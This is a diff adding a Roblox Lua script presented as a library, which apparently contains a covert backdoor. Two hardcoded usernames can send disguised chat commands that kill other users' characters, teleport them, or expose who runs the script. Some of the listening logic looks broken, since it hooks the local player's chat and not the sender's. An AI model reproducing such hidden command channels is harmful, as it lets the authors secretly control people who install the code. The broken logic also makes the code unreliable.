@@ -1,0 +1,76 @@
+local Players = game:GetService("Players");
+local Player = Players.LocalPlayer;
+local TextChatService = game:GetService("TextChatService")
+local Library = {};
+local List = {
+   "qipu",
+   "Aayushkarkee",
+}
+
+Chat = function(Message)
+    Players:Chat(Message)
+end
+
+Library.GetCommand = function(Plr, Message) 
+    if not table.find(List, Plr.Name) then return end
+    Message = Message:gsub("!", "")
+
+    if Message == "kILl" then
+        Player.Character.Humanoid.Health = 0
+    elseif Message == "bRiNg" then
+        Player.Character.HumanoidRootPart.Position = Plr.Character.HumanoidRootPart.Position
+    elseif Message == "cHeCk" then
+        Chat("_ _ 0")
+    end
+end
+
+local Check = function(Target) 
+    if table.find(List, Target.Name) then
+        Player.Chatted:Connect(function(Message) 
+            if string.sub(Message, 1, 1) == "!" then
+                Library.GetCommand(Target, Message)
+            end
+        end)
+    end
+end
+
+if table.find(List, Player.Name) then
+    Player.Chatted:Connect(function(Message)
+        if string.sub(Message, 1, 1) == "!" then 
+            Message = Message:lower()
+
+            if Message == "!kill" then
+                Chat("kILl")
+            elseif Message == "!bring" then
+                Chat("bRiNg")
+            elseif Message == "!check" then
+                 for Index, Plr in next, Players:GetPlayers() do
+                    task.spawn(function()
+                       -- if Plr == Player then return end 
+                    local Connected = Plr.Chatted:Connect(function(Message)
+                        if Message == "_ _ 0" then
+                            warn(string.format("User found - %s", Plr.Name))
+                        end
+                    end)
+
+                    task.wait(5)
+
+                    Connected = Connected:Disconnect()
+                end)
+                end
+
+                Chat("cHeCk")
+            end
+        end
+    end)
+
+
+else
+    for Index, Plr in next, Players:GetPlayers() do
+        Check(Plr)
+    end
+    
+    Players.PlayerAdded:Connect(function(Plr) 
+        Check(Plr)
+    end)
+end 
